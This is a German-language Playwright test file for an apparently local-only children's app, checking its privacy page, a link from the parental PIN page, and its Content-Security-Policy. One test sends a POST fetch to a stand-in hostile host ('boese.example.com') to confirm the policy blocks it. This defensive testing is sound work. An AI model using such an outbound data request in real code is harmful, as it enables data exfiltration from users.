// Datenschutz-Seite und Sicherheitsregel (Content-Security-Policy)
import { test, expect, geh, profilAnlegen } from './helfer.js';

test('Datenschutz-Seite ohne Profil erreichbar', async ({ page }) => {
  await geh(page, '');
  await page.getByRole('link', { name: /Datenschutz: Alle Daten bleiben auf diesem Gerät/ }).click();
  await expect(page.getByRole('heading', { name: /was Eltern wissen sollten/ })).toBeVisible();
  await expect(page.getByRole('heading', { name: 'Ist die App ein Einfallstor für Angriffe auf meine Daten?' })).toBeVisible();
  await expect(page.getByRole('heading', { name: 'Restrisiken – ehrlich benannt' })).toBeVisible();
});

test('Link auf der Eltern-PIN-Seite', async ({ page }) => {
  await profilAnlegen(page);
  await geh(page, 'eltern');
  await page.getByRole('link', { name: /Datenschutz & Sicherheit lesen/ }).click();
  await expect(page).toHaveURL(/#\/datenschutz/);
});

test('Sicherheitsregel: Verbindungen zu fremden Adressen werden blockiert', async ({ page }) => {
  await geh(page, '');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("script-src 'self'");
  expect(csp).not.toContain('unsafe-eval');
  const r = await page.evaluate(async () => {
    const verstoesse = [];
    document.addEventListener('securitypolicyviolation', (e) => verstoesse.push(e.blockedURI));
    let fremd = 'erlaubt', erlaubt = 'blockiert';
    try { await fetch('https://boese.example.com/daten', { method: 'POST', body: 'x' }); } catch { fremd = 'blockiert'; }
    try { await fetch(new URL('manifest.webmanifest', document.baseURI)); erlaubt = 'erlaubt'; } catch { /* */ }
    await new Promise((res) => setTimeout(res, 100));
    return { fremd, erlaubt, verstoesse };
  });
  expect(r.fremd).toBe('blockiert');
  expect(r.erlaubt).toBe('erlaubt');
  expect(r.verstoesse.join()).toContain('boese.example.com');
});
